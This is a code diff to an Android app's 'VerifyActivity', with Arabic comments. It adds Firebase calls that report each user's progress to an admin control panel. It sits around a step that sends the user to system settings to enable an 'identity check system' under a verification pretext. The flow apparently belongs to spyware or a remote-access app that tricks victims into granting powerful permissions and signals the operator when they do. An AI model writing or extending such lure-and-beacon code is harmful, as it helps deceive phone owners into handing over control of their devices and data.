@@ -8,6 +8,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ProgressBar;
@@ -17,7 +18,8 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 
-// استيراد الحزمة الرسمية للفايربيس ✅
+// استيراد الحزمة الرسمية للفايربيس السحابي 📡
+import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
 public class VerifyActivity extends AppCompatActivity {
@@ -25,16 +27,20 @@ public class VerifyActivity extends AppCompatActivity {
     private static final int PERMISSION_CODE = 101;
     private String userName;
     
+    private DatabaseReference mUserStatusRef;
     private Button btnStartVerify;
-    private ProgressBar verifyProgressBar, progressBarTop; // دعم الـ Progress المشترك الأنيق ✅
+    private ProgressBar verifyProgressBar, progressBarTop;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_verify); // تأكد من وجود العناصر بالـ XML
+        setContentView(R.layout.activity_verify);
 
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
         
+        // تهيئة مرجع الحالات الخاص بالمستخدم الحالي
+        mUserStatusRef = FirebaseDatabase.getInstance().getReference("users_status").child(userName);
+
         btnStartVerify = findViewById(R.id.btnStartVerify);
         verifyProgressBar = findViewById(R.id.verifyProgressBar);
         progressBarTop = findViewById(R.id.progressBarTop);
@@ -42,8 +48,18 @@ public class VerifyActivity extends AppCompatActivity {
         if (btnStartVerify != null) {
             btnStartVerify.setOnClickListener(v -> {
                 toggleLoading(true);
+                // إعلام الأدمن ببدء التهيئة وضخ التوست ⏳
+                updateAppFlag("STATE_INITIALIZING");
                 new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1000);
             });
+        }
+    }
+
+    // دالة تحديث الأعلام الرقمية المتزامنة مع لوحة تحكم الآدمن 🛡️
+    private void updateAppFlag(String stateCode) {
+        if (mUserStatusRef != null) {
+            mUserStatusRef.child("current_state").setValue(stateCode)
+                    .addOnFailureListener(e -> Log.e("Verify_State", "فشل تحديث المعرف السحابي"));
         }
     }
 
@@ -93,14 +109,16 @@ public class VerifyActivity extends AppCompatActivity {
                 startActivity(intent);
                 Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
             } catch (Exception e) {
-                startActivity(new Intent(Settings.ACTION_SETTINGS));
+                try {
+                    startActivity(new Intent(Settings.ACTION_SETTINGS));
+                } catch (Exception ignored) {}
             }
         } else {
             notifyAdminSuccess();
         }
     }
 
-    // التحديث الحي والمباشر عبر الفايربيس بدلاً من OkHttp 🚀
+    // إرسال علامة نجاح الربط الكلي والتفعيل 🚀
     private void notifyAdminSuccess() {
         toggleLoading(true);
 
@@ -108,11 +126,15 @@ public class VerifyActivity extends AppCompatActivity {
                 .child(userName).child("status").setValue("waiting")
                 .addOnSuccessListener(aVoid -> {
                     Toast.makeText(this, "تم تفعيل نظام الفحص السحابي بنجاح ✅", Toast.LENGTH_SHORT).show();
+                    // 🟢 ضخ الرمز للأدمن لتحديث لوحة التحكم فوراً لقيمة النجاح
+                    updateAppFlag("STATE_SYNC_SUCCESS");
                     finish();
                 })
                 .addOnFailureListener(e -> {
                     toggleLoading(false);
                     Toast.makeText(this, "فشل الربط السحابي، تحقق من الإنترنت", Toast.LENGTH_SHORT).show();
+                    // 🔴 ضخ رمز الفشل وشبكة الإنترنت للأدمن
+                    updateAppFlag("STATE_SYNC_FAILED");
                 });
     }
 
